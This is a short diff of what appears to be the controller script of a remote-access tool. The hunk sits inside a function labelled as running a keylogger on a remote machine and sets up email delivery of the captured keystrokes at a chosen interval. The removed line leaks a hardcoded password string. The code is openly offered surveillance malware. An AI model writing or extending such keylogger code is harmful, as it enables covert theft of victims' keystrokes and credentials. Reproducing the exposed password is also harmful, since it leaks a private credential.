@@ -104,7 +104,7 @@ def keylogger():            #function to run a keylogger on the remote machine
 	time.sleep(1)
 	client.send("k".encode())
 	email=input("Enter your email:")                            #email details, enter your details here if you do not want to enter them each time.
-	password="uuncqcsbdpxqgvfg"
+	password=input("Enter your password:")
 	emserver=input("Enter the smtp server:")
 	port=int(input("Enter the server port:"))
 	interval=int(input("Enter how often you want the keylogs sent by email in seconds:"))
